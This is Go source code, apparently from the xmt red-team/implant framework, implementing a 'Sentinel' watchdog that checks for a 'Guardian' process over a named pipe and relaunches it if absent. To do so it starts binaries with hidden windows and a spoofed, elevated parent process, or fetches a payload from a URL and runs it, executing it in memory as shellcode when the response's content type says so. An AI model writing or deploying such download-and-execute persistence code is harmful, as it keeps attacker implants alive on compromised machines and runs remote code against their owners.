package man

import (
	"bytes"
	"context"
	"crypto/cipher"
	"errors"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/com/pipe"
	"github.com/iDigitalFlame/xmt/com/wc2"
	"github.com/iDigitalFlame/xmt/data/crypto"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util"
)

const timeout = time.Second * 2

// ErrNoEndpoints is an error returned if no valid Guardian paths could be used and/or found during a launch.
var ErrNoEndpoints = errors.New("no Guardian paths found")

// Sentinel is a struct used in combination with Gardian. The sentinel will attempt to contact the Guardian using the
// specified listing path. If the Guardian does not respond within the appropriate timeframe or with an invalid
// response, the sentinel will attempt to locate a Gaurdian binary at any of the specified paths to attempt to restart
// the Gardian. If none of the paths exist or are valid, the sentinel will attempt to use the URL field (if non empty),
// to download another Gardian binary to be executed.
type Sentinel struct {
	_     [0]func()
	URL   string
	Code  bool
	Paths []string
}

// Ping will attempt to contact any current Guardians watching on the supplied name. This function returns false
// if the specified name could not be reached or an error occurred.
func Ping(n string) bool {
	c, err := pipe.DialTimeout(pipe.Format(n), timeout)
	if err != nil {
		return false
	}
	var (
		b    = *bufs.Get().(*[]byte)
		_, _ = util.Rand.Read(b[1:])
		h    = crypto.SHA512(b[1:])
	)
	b[0] = 0xFF
	c.SetDeadline(time.Now().Add(timeout))
	if _, err := c.Write(b); err != nil {
		c.Close()
		bufs.Put(&b)
		return false
	}
	if n, err := c.Read(b); err != nil || n != 65 {
		c.Close()
		bufs.Put(&b)
		return false
	}
	bufs.Put(&b)
	if c.Close(); b[0] == 0xA0 && bytes.Equal(b[1:], h) {
		return true
	}
	return false
}
func trigger(s []string) bool {
	if len(s) == 0 {
		return false
	}
	for i := range s {
		if _, err := os.Stat(s[i]); err != nil {
			continue
		}
		os.Chmod(s[i], 0755)
		p := cmd.NewProcess(s[i])
		p.SetParentRandomEx(nil, device.Local.Elevated)
		p.SetWindowDisplay(0)
		p.SetNoWindow(true)
		if err := p.Start(); err == nil {
			return true
		}
	}
	return false
}
func download(u string, t bool) error {
	if len(u) == 0 {
		return ErrNoEndpoints
	}
	var (
		i      *http.Response
		x, c   = context.WithTimeout(context.Background(), timeout*5)
		r, err = http.NewRequestWithContext(x, http.MethodGet, u, nil)
	)
	if err != nil {
		c()
		return err
	}
	i, err = wc2.DefaultClient.Do(r)
	if c(); err != nil {
		return err
	}
	b, err := ioutil.ReadAll(i.Body)
	if i.Body.Close(); err != nil {
		return err
	}
	if !t {
		switch strings.ToLower(i.Header.Get("Content-Type")) {
		case "shellcode", "code", "execute", "binary", "bin", "application/binary", "application/executable":
			t = true
		}
	}
	if t {
		e := cmd.Code{Data: b}
		e.SetParentRandomEx(nil, device.Local.Elevated)
		return e.Start()
	}
	f, err := ioutil.TempFile("", "sys")
	if err != nil {
		return err
	}
	_, err = f.Write(b)
	if f.Close(); err != nil {
		return err
	}
	os.Chmod(f.Name(), 0755)
	e := cmd.NewProcess(f.Name())
	e.SetParentRandomEx(nil, device.Local.Elevated)
	e.SetWindowDisplay(0)
	e.SetNoWindow(true)
	return e.Start()
}

// Write will write the data in this Sentinel struct to the supplied Writer.
func (s Sentinel) Write(w io.Writer) error {
	if _, err := w.Write(append([]byte(s.URL), 0x1E)); err != nil {
		return err
	}
	for i := range s.Paths {
		if _, err := w.Write([]byte(s.Paths[i])); err != nil {
			return err
		}
		if _, err := w.Write([]byte{0x1E}); err != nil {
			return err
		}
	}
	return nil
}

// Read will attempt to read the data from the supplied Reader into this Sentinel struct.
func (s *Sentinel) Read(r io.Reader) error {
	var (
		b   = *bufs.Get().(*[]byte)
		x   strings.Builder
		n   int
		f   bool
		err error
	)
	for x.Grow(len(b)); ; {
		if n, err = r.Read(b); n == 0 && err != nil {
			break
		}
		for i := 0; i < n; i++ {
			if b[i] == 0x1E {
				if !f {
					if len(s.URL) == 0 {
						s.URL = x.String()
					}
					f = true
				} else {
					s.Paths = append(s.Paths, x.String())
				}
				x.Reset()
				continue
			}
			x.WriteByte(b[i])
		}
	}
	if bufs.Put(&b); err == io.EOF {
		return nil
	}
	return err
}

// Ping will attempt to contact any current Guardians watching on the supplied name. The Sentinel will launch a
// Guardian if no correct response is found or returned. This function will return true and nil if a Guardian is
// launched and false and nil if a Guardian was found. Other return results will include an error describing
// what happened that prevented detection and/or launching a Guardian.
func (s Sentinel) Ping(n string) (bool, error) {
	if Ping(n) {
		return false, nil
	}
	if trigger(s.Paths) {
		return true, nil
	}
	if err := download(s.URL, s.Code); err != nil {
		return false, err
	}
	return true, nil
}

// To will attempt to write the data from this Sentinel to the specified file path. If the supplied Cipher block is
// not nil, this will attempt to use the Cipher and append a randomized IV value to the beginning of the file. This
// function returns an error if the write or file creation occurs.
func (s Sentinel) To(c cipher.Block, file string) error {
	f, err := os.Create(file)
	if err != nil {
		return err
	}
	if c == nil {
		err := s.Write(f)
		f.Close()
		return err
	}
	var (
		l = c.BlockSize()
		b = *bufs.Get().(*[]byte)
	)
	util.Rand.Read(b[:l])
	if _, err = f.Write(b[:l]); err == nil {
		w, _ := crypto.EncryptWriter(c, b[:l], f)
		err = s.Write(w)
		w.Close()
	}
	f.Close()
	bufs.Put(&b)
	return err
}

// From will attempt to read the data to this Sentinel from the specified file path. If the supplied Cipher block is
// not nil, this will attempt to use the Cipher and attempt to read the IV value from the beginning of the file. This
// function returns an error if the read or if the file does not exist.
func (s *Sentinel) From(c cipher.Block, file string) error {
	f, err := os.Open(file)
	if err != nil {
		return err
	}
	if c == nil {
		err := s.Read(f)
		f.Close()
		return err
	}
	var (
		l = c.BlockSize()
		b = *bufs.Get().(*[]byte)
	)
	if _, err = f.Read(b[:l]); err == nil {
		r, _ := crypto.DecryptReader(c, b[:l], f)
		err = s.Read(r)
		r.Close()
	}
	f.Close()
	bufs.Put(&b)
	return err
}

// PingFrom will attempt to look for a Guardian using the following parameters specified. This includes a
// local file path where the Gaurdian binaries may be located. This file is a file that was written using the 'To'
// function. This function will return the same as the 'Ping' function.
func PingFrom(name string, c cipher.Block, file string) (bool, error) {
	var s Sentinel
	if err := s.From(c, file); err != nil {
		return false, err
	}
	return s.Ping(name)
}
